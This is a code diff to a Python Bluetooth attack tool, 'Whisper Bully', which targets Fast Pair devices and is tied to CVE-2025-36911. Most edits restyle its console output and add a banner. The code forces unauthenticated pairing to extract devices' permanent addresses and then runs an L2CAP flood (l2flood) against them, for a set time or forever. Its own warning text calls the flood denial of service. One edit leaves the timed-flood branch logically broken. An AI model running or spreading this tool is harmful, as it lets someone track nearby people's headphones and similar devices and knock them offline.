@@ -37,15 +37,15 @@ class Device:
 
 def reset_bluetooth() -> None:
     """Reset Bluetooth adapter by powering off and on."""
-    print("[*] Resetting Bluetooth adapter...")
+    info("Resetting Bluetooth adapter...")
     try:
         subprocess.run(['sudo', 'bluetoothctl', 'power', 'off'], check=True, timeout=5)
         time.sleep(1)
         subprocess.run(['sudo', 'bluetoothctl', 'power', 'on'], check=True, timeout=5)
         time.sleep(2)  # Give time for adapter to reinitialize
-        print("[+] Bluetooth adapter reset complete.")
+        ok("Bluetooth adapter reset complete.")
     except Exception as e:
-        print(f"[!] Failed to reset Bluetooth: {e}")
+        warn(f"Failed to reset Bluetooth: {e}")
 
 
 def get_all_devices() -> List[Tuple[str, str]]:
@@ -123,7 +123,6 @@ async def scan_fastpair(duration: int = 10) -> List[Device]:
     found = []
 
     def callback(dev, adv):
-        # Only report devices with Fast Pair service UUID
         has_fastpair = any(
             FAST_PAIR_SERVICE.lower() in u.lower() or
             FAST_PAIR_16BIT.lower() in u.lower()
@@ -132,7 +131,7 @@ async def scan_fastpair(duration: int = 10) -> List[Device]:
         if not has_fastpair:
             return
 
-        # Skip if already found (avoid duplicates from multiple scan reports)
+        # bleak fires the callback multiple times per advertisement burst
         if any(d.address == dev.address for d in found):
             return
 
@@ -150,30 +149,29 @@ async def run_aggressive_test(results: List[dict], output_file: str = None) -> N
     """
     Prompt for and optionally run aggressive L2CAP testing on extracted addresses.
     """
-    print("\n" + "=" * 70)
-    print("⚠️  LEGAL WARNING - READ BEFORE PROCEEDING")
-    print("=" * 70)
-    print("\nAggressive L2CAP flooding causes device disruption and DoS.")
-    print("Unauthorized use on devices you don't own is a FEDERAL CRIME.")
-    print("\nYou may ONLY test devices:")
-    print("  • You own")
-    print("  • With EXPLICIT WRITTEN permission from the owner")
-    print("\nSee LEGAL_WARNING.md for full details.")
-    print("=" * 70 + "\n")
+    print(); div("═")
+    print(f"  {YELLOW}⚠️  LEGAL WARNING — READ BEFORE PROCEEDING{RESET}")
+    div("═")
+    warn("Aggressive L2CAP flooding causes device disruption and DoS.")
+    warn(f"Unauthorized use on devices you don't own is a {BRED}FEDERAL CRIME{RESET}{YELLOW}.")
+    print(f"\n{WHITE}You may ONLY test devices:{RESET}")
+    print(f"  {CYAN}•{RESET} You own")
+    print(f"  {CYAN}•{RESET} With EXPLICIT WRITTEN permission from the owner")
+    info("See LEGAL_WARNING.md for full details.")
+    div("═"); print()
 
     try:
         auth_confirm = input(
             "Do you have authorization to flood these devices? Type 'yes' to continue: "
         ).strip().lower()
     except KeyboardInterrupt:
-        print("\n[*] Interrupted. Exiting.")
+        info("\nInterrupted. Exiting.")
         sys.exit(0)
 
     if auth_confirm != "yes":
-        print("[*] Aggressive test cancelled.")
+        info("Aggressive test cancelled.")
         return
 
-    # Ask for test parameters
     try:
         duration_input = input("Flood duration: seconds or 'f' for forever (default 60): ").strip().lower()
     except KeyboardInterrupt:
@@ -207,28 +205,25 @@ async def run_aggressive_test(results: List[dict], output_file: str = None) -> N
 
     hci = hci if hci else None
 
-    # Reset Bluetooth before starting aggressive test
     reset_bluetooth()
 
-    print(f"\n[*] Starting aggressive L2CAP flood on {len(results)} device(s)...")
+    print(); info(f"Starting aggressive L2CAP flood on {CYAN}{len(results)}{RESET} device(s)...")
     if duration is None:
-        print(f"    Duration: FOREVER (press Ctrl+C to stop)")
+        print(f"    {DIM}Duration :{RESET} {YELLOW}FOREVER{RESET} (Ctrl+C to stop)")
     else:
-        print(f"    Duration: {duration}s")
+        print(f"    {DIM}Duration :{RESET} {duration}s")
     if threads:
-        print(f"    Threads: {threads}")
+        print(f"    {DIM}Threads  :{RESET} {threads}")
     if hci:
-        print(f"    HCI: {hci}")
+        print(f"    {DIM}HCI      :{RESET} {hci}")
     print()
 
-    # Run l2flood on each extracted address
     for i, result in enumerate(results, 1):
         permanent_addr = result.get("permanent_address")
         device_name = result.get("device_name")
 
-        print(f"\n[*] Target {i}/{len(results)}: {device_name} ({permanent_addr})")
+        print(); div(); info(f"Target {CYAN}{i}/{len(results)}{RESET}: {WHITE}{device_name}{RESET} ({CYAN}{permanent_addr}{RESET}")
 
-        # Build l2flood command
         cmd = ["sudo", "l2flood", "-R"]
         if hci:
             cmd.extend(["-i", hci])
@@ -245,48 +240,41 @@ async def run_aggressive_test(results: List[dict], output_file: str = None) -> N
                 text=True
             )
 
-            # Run for specified duration or infinite
             try:
                 if duration is None:
-                    # Run forever until Ctrl+C
                     proc.wait()
-                else:
-                    # Run for specified duration
                     proc.wait(timeout=duration)
             except subprocess.TimeoutExpired:
-                # Duration limit reached, stop the flood
-                print(f"[*] Duration limit reached, stopping flood...")
+                info("Duration limit reached, stopping flood...")
                 proc.send_signal(2)  # SIGINT
                 try:
                     proc.wait(timeout=5)
                 except subprocess.TimeoutExpired:
                     proc.kill()
             except KeyboardInterrupt:
-                # Ctrl+C pressed - stop flood silently and exit
                 proc.send_signal(2)  # SIGINT
                 try:
                     proc.wait(timeout=5)
                 except subprocess.TimeoutExpired:
                     proc.kill()
-                print("\n[*] Flood stopped. Exiting.")
+                info("\nFlood stopped. Exiting.")
                 sys.exit(0)
 
             stdout, stderr = proc.communicate()
             if stdout:
-                print(f"    {stdout.strip()[:100]}")
-            print(f"[+] Flood completed for {device_name}")
+                print(f"  {DIM}{stdout.strip()[:100]}{RESET}")
+            ok(f"Flood completed for {device_name}")
 
         except FileNotFoundError:
-            print("[-] l2flood not found. Build it: make && sudo make install")
+            err("l2flood not found. Build it: make && sudo make install")
             return
         except Exception as e:
-            print(f"[-] Error: {e}")
+            err(f"Error: {e}")
 
-        # Brief pause between targets
         if i < len(results):
             await asyncio.sleep(2)
 
-    print(f"\n[+] Aggressive testing completed on {len(results)} device(s)")
+    print(); ok(f"Aggressive testing completed on {CYAN}{len(results)}{RESET} device(s)")
 
 
 async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
@@ -297,35 +285,34 @@ async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
     """
     client = None
     try:
-        print(f"[*] Establishing BLE connection to {device_addr}...")
+        info(f"Establishing BLE connection to {CYAN}{device_addr}{RESET}...")
         client = BleakClient(device_addr, timeout=10.0)
         await client.connect()
-        print(f"[+] Connected")
+        ok("Connected")
 
         set_agent("NoInputNoOutput")
         await asyncio.sleep(1)
 
-        # Verify Fast Pair service exists (informational only)
+        # service check is advisory — pairing is attempted regardless
         fp_found = any(
             FAST_PAIR_SERVICE.lower() in str(svc.uuid).lower() or
             FAST_PAIR_16BIT.lower() in str(svc.uuid).lower()
             for svc in client.services
         )
         if fp_found:
-            print("[+] Fast Pair service confirmed")
+            ok("Fast Pair service confirmed")
         else:
-            print("[!] Fast Pair service not found, attempting pairing anyway")
+            warn("Fast Pair service not found — attempting pairing anyway")
 
     except Exception as e:
-        print(f"[-] BLE connection failed: {e}")
+        err(f"BLE connection failed: {e}")
         return None
 
-    # Trigger pairing while BLE connection is open
     bonded_addr = None
     pairing_success = False
 
     try:
-        print("[*] Running pairing (monitoring for permanent address)...")
+        info("Running pairing (monitoring for permanent address)...")
 
         proc = subprocess.Popen(
             ['sudo', 'bluetoothctl', 'pair', device_addr],
@@ -337,17 +324,16 @@ async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
 
         start_time = time.time()
 
-        # Parse pairing output for [CHG] Device bonding messages
         for line in proc.stdout:
-            print(f"  {line.rstrip()}")
+            print(f"  {DIM}{line.rstrip()}{RESET}")
 
-            # Look for the "Bonded: yes" line as source of truth
-            # Extract device address from Bonded: yes line
+            # "Bonded: yes" is the authoritative signal; pairing output
+            # doesn't always emit a separate address-changed event
             if "Bonded: yes" in line:
                 m = re.search(r'Device\s+([0-9A-F:]{17})', line, re.I)
                 if m:
                     bonded_addr = m.group(1)
-                    print(f"[+++] CAPTURED BONDED ADDRESS: {bonded_addr}")
+                    hit(f"CAPTURED BONDED ADDRESS: {bonded_addr}")
 
             if "Pairing successful" in line:
                 pairing_success = True
@@ -361,11 +347,11 @@ async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
             return bonded_addr
 
         if pairing_success:
-            print("[*] Pairing succeeded, scanning for address...")
+            info("Pairing succeeded — scanning for address...")
             await asyncio.sleep(2)
 
     except Exception as e:
-        print(f"[!] Pairing error: {e}")
+        warn(f"Pairing error: {e}")
     finally:
         if client and client.is_connected:
             try:
@@ -373,12 +359,11 @@ async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
             except Exception:
                 pass
 
-    # Fallback: scan device list for matching name with different address
     try:
         await asyncio.sleep(1)
         all_devs = get_all_devices()
 
-        print(f"[*] Device list ({len(all_devs)} total):")
+        info(f"Device list ({CYAN}{len(all_devs)}{RESET} total):")
         for addr, name in all_devs:
             marker = ""
             if device_name.lower() in name.lower():
@@ -386,22 +371,68 @@ async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
                     marker = " ← PERMANENT"
                 else:
                     marker = " (temporary)"
-            print(f"    {addr} - {name}{marker}")
+            print(f"    {CYAN}{addr}{RESET}  {WHITE}{name}{RESET}{BGREEN}{marker}{RESET}")
 
-        # Find device with matching name but different address
         for addr, name in all_devs:
             if (device_name.lower() in name.lower() and
                     addr.lower() != device_addr.lower()):
-                print(f"\n[+] EXTRACTED PERMANENT ADDRESS: {addr}")
+                print(); hit(f"EXTRACTED PERMANENT ADDRESS: {addr}")
                 return addr
 
     except Exception as e:
-        print(f"[!] Device scan failed: {e}")
+        warn(f"Device scan failed: {e}")
 
     return None
 
 
+ASCII_ART = """
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠉⠉⣉⣉⣉⣉⣉⣉⣁⣠⣤⣤⣤⣤⣤⣄⠀⠀⠉⠉⠉⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⢟⡍⣤⣶⣄⠀⣶⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣆⢀⣠⣾⣶⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡿⣵⣿⡇⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣦⡈⢿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⠋⣴⣿⣿⡇⢻⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⢱⣿⣷⠀⢻⣿⣿⣿⣿
+⣿⣿⣿⡿⠁⢰⣯⢻⣿⣷⡘⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⢡⣿⣿⣿⡇⠸⣿⣿⣿⣿
+⣿⣿⠟⠀⠀⠀⠙⠊⠻⠟⠣⠈⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠏⠴⠟⣿⡿⢋⣴⡀⢻⣿⣿⣿
+⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠋⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠻⣿⣿
+⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠈⢻
+⡀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣷⠆⠀⠀⠀⢀⣤⠶⣲⠻⣭⠙⢩⡉⢝⡓⠒⠦⣄⠀⠀⠀⠀⠀⢠⣬⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀⠀⢸
+⣇⠀⠀⠀⠀⠀⠀⠀⢩⣽⣿⣿⣿⡶⠀⠀⣼⠋⠺⠌⠋⠀⠛⠀⠙⠋⠡⠟⠀⣷⠈⢻⡄⠀⠀⠀⢶⣿⣿⣿⡿⡆⠀⠀⠀⠀⠀⠀⠀⣸
+⣿⣆⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣧⠀⠀⠀⠙⠧⣄⡆⠰⡄⢦⠄⣠⠆⣠⠆⢠⢆⡠⠞⠁⠀⠀⢀⣼⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⣠⣿
+⣿⣿⣧⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣄⣀⠀⠀⠀⠛⠻⠤⠤⠤⠤⠤⠧⠤⠟⠛⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿
+⣿⣿⣿⣿⣦⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠈⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣍⣙⡛⠻⠿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⣛⣛⣉⣭⣥⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+"""
+
+# ── colours ──────────────────────────────────────────────────────────────────
+RED     = "\033[91m"
+BRED    = "\033[1;91m"
+GREEN   = "\033[92m"
+BGREEN  = "\033[1;92m"
+YELLOW  = "\033[93m"
+CYAN    = "\033[96m"
+BCYAN   = "\033[1;96m"
+WHITE   = "\033[97m"
+DIM     = "\033[2m"
+RESET   = "\033[0m"
+
+def info(msg):    print(f"{DIM}{WHITE}[*]{RESET} {msg}")
+def ok(msg):      print(f"{BGREEN}[+]{RESET} {msg}")
+def warn(msg):    print(f"{YELLOW}[!]{RESET} {msg}")
+def err(msg):     print(f"{RED}[-]{RESET} {msg}")
+def hit(msg):     print(f"{BGREEN}[+++]{RESET} {BGREEN}{msg}{RESET}")
+def div(char="─", n=66): print(f"{DIM}{char * n}{RESET}")
+
+def print_banner():
+    print(RED + ASCII_ART + RESET)
+    div("═")
+    print(f"  {BRED}Whisper Bully{RESET}  {DIM}·{RESET}  Fast Pair BD ADDR Extractor")
+    print(f"  {DIM}CVE-2025-36911  ·  github.com/your-org/whisper-bully{RESET}")
+    div("═")
+    print()
+
+
 async def main():
+    print_banner()
     parser = argparse.ArgumentParser(
         description="Whisper Bully: Fast Pair BD ADDR Extractor (CVE-2025-36911)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -432,28 +463,25 @@ Examples:
     args = parser.parse_args()
 
     if os.geteuid() != 0:
-        print("This script requires root. Run with sudo.")
+        err("This script requires root. Run with sudo.")
         return
 
-    print("\n" + "=" * 70)
-    print("  Whisper Bully: Fast Pair BD ADDR Extractor")
-    print("=" * 70 + "\n")
 
-    print(f"[*] Scanning for Fast Pair devices ({args.scan_time}s)...")
+
+    info(f"Scanning for Fast Pair devices ({CYAN}{args.scan_time}s{RESET})...")
     devices = await scan_fastpair(args.scan_time)
 
     if not devices:
-        print("[-] No Fast Pair devices found.")
+        err("No Fast Pair devices found.")
         return
 
-    print(f"[+] Found {len(devices)} device(s):")
+    ok(f"Found {CYAN}{len(devices)}{RESET} device(s):")
     for i, dev in enumerate(devices, 1):
-        print(f"  {i}. {dev.name} ({dev.address}) - RSSI: {dev.rssi}dBm")
+        print(f"  {CYAN}{i}.{RESET} {WHITE}{dev.name}{RESET}  {DIM}{dev.address}{RESET}  RSSI: {dev.rssi} dBm")
 
-    # Device selection
     if len(devices) == 1:
         selected = [devices[0]]
-        print(f"\n[*] Single device found, auto-selecting: {devices[0].name}")
+        print(); info(f"Single device found — auto-selecting: {WHITE}{devices[0].name}{RESET}")
     else:
         while True:
             selection = input(
@@ -462,33 +490,33 @@ Examples:
 
             if selection == "a":
                 selected = devices
-                print(f"[*] Selected all {len(devices)} device(s)")
+                info(f"Selected all {CYAN}{len(devices)}{RESET} device(s)")
                 break
 
             try:
                 indices = [int(x.strip()) - 1 for x in selection.split(",")]
                 if all(0 <= idx < len(devices) for idx in indices):
                     selected = [devices[idx] for idx in indices]
-                    print(f"[*] Selected {len(selected)} device(s)")
+                    info(f"Selected {CYAN}{len(selected)}{RESET} device(s)")
                     break
                 else:
-                    print("[-] Invalid selection. Try again.")
+                    err("Invalid selection. Try again.")
             except ValueError:
-                print("[-] Invalid input. Use numbers (e.g., '1' or '1,3,5') or 'a'")
+                err("Invalid input. Use numbers (e.g., '1' or '1,3,5') or 'a'")
 
     results = []
-    print(f"\n[*] Extracting {len(selected)} device(s)...\n")
+    print(); info(f"Extracting {CYAN}{len(selected)}{RESET} device(s)..."); print()
 
     for dev in selected:
-        print(f"[*] Processing: {dev.name} ({dev.address})")
+        div(); info(f"Processing: {WHITE}{dev.name}{RESET}  {DIM}{dev.address}{RESET}")
         permanent_addr = await extract_bdaddr(dev.address, dev.name)
 
         if permanent_addr:
-            print("=" * 70)
-            print(f"✅ PERMANENT BD ADDR: {permanent_addr}")
-            print(f"   Temporary address: {dev.address}")
-            print(f"   Device name: {dev.name}")
-            print("=" * 70 + "\n")
+            div("═")
+            hit(f"PERMANENT BD ADDR : {permanent_addr}")
+            print(f"  {DIM}Temp address     : {dev.address}{RESET}")
+            print(f"  {DIM}Device name      : {dev.name}{RESET}")
+            div("═"); print()
             results.append({
                 "device_name": dev.name,
                 "temporary_address": dev.address,
@@ -496,49 +524,46 @@ Examples:
                 "rssi": dev.rssi
             })
         else:
-            print("❌ Failed to extract.\n")
+            err("Failed to extract.\n")
 
-    # Save results if requested
     if args.output:
         try:
             with open(args.output, 'w') as f:
                 json.dump(results, f, indent=2)
-            print(f"\n[+] Results saved to: {args.output}")
-            print(f"[+] Extracted {len(results)}/{len(selected)} device(s)")
+            print(); ok(f"Results saved to: {WHITE}{args.output}{RESET}")
+            ok(f"Extracted {BGREEN}{len(results)}/{len(selected)}{RESET} device(s)")
         except IOError as e:
-            print(f"[-] Failed to save file: {e}")
+            err(f"Failed to save file: {e}")
     else:
         if results:
-            print(f"\n[+] Successfully extracted {len(results)}/{len(selected)} device(s)")
+            print(); ok(f"Successfully extracted {BGREEN}{len(results)}/{len(selected)}{RESET} device(s)")
         else:
-            print("\n[-] No devices extracted.")
+            print(); err("No devices extracted.")
 
-    # Prompt for aggressive testing if extraction was successful
     if results and len(results) > 0:
         if args.aggressive:
-            # Skip prompts, run directly
             await run_aggressive_test(results, args.output)
         else:
-            print("\n" + "=" * 70)
-            print("⚠️  AGGRESSIVE L2CAP TESTING (OPTIONAL)")
-            print("=" * 70)
-            print(f"\n[*] Found {len(results)} extracted device(s).")
-            print("[*] You can now run aggressive L2CAP flood testing using l2flood -R mode.")
-            print("[*] This requires explicit authorization for each device.\n")
+            print(); div("═")
+            print(f"  {YELLOW}⚠️  AGGRESSIVE L2CAP TESTING (OPTIONAL){RESET}")
+            div("═")
+            print(); info(f"Found {CYAN}{len(results)}{RESET} extracted device(s).")
+            info(f"You can now run aggressive L2CAP flood testing using {WHITE}l2flood -R{RESET} mode.")
+            warn("This requires explicit authorization for each device."); print()
 
             aggressive_prompt = input(
                 "Run aggressive L2CAP test on extracted addresses now? (yes/no): "
             ).strip().lower()
 
             if aggressive_prompt == "yes":
-                print("\n[*] Starting aggressive test mode...")
+                print(); info("Starting aggressive test mode...")
                 await run_aggressive_test(results, args.output)
 
 
 if __name__ == "__main__":
     def signal_handler(sig, frame):
         """Clean exit on Ctrl+C without traceback."""
-        print("\n\n[*] Interrupted by user. Exiting cleanly...")
+        print(); info("Interrupted by user. Exiting cleanly...")
         sys.exit(0)
 
     signal.signal(signal.SIGINT, signal_handler)
@@ -549,5 +574,5 @@ if __name__ == "__main__":
         print("\n\n[*] Interrupted by user. Exiting cleanly...")
         sys.exit(0)
     except Exception as e:
-        print(f"[-] Unexpected error: {e}")
+        err(f"Unexpected error: {e}")
         sys.exit(1)
